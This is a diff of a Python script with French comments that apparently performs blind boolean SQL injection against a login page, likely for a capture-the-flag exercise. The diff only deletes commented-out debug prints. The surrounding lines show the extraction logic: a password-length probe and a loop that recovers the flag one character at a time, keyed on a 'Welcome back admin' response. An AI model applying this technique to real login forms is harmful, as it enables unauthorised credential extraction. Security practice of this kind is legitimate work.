@@ -20,9 +20,7 @@ def get_password_length(session, username, url):
         }
         
         response = session.post(url, data=data)
-        
-        # Affiche le code de statut HTTP
-        #print(f"Status Code: {response.status_code}")
+
         
         # Vérifie la réponse pour déterminer si la longueur est correcte
         if 'Welcome back admin' in response.text:
@@ -61,12 +59,6 @@ def injectsql(url, login_data):
             # Envoi de la requête POST
             response = session.post(url, data=data)
             
-            # Afficher le code de statut HTTP
-            #print(f"Status Code: {response.status_code}")
-            
-            # Afficher le contenu de la réponse pour vérifier ce que le serveur renvoie
-            #print(f"Response Text:\n{response.text[:500]}")  # Limite l'affichage aux 500 premiers caractères
-            
             # Condition pour détecter une réponse correcte
             if 'Welcome back admin' in response.text:
                 flag += c
@@ -77,8 +69,6 @@ def injectsql(url, login_data):
     end = time.time()
     rt = end - start
     print('Temps total de réponse: ', rt)
-
-#injectsql()
 
 if __name__=="__main__":
 
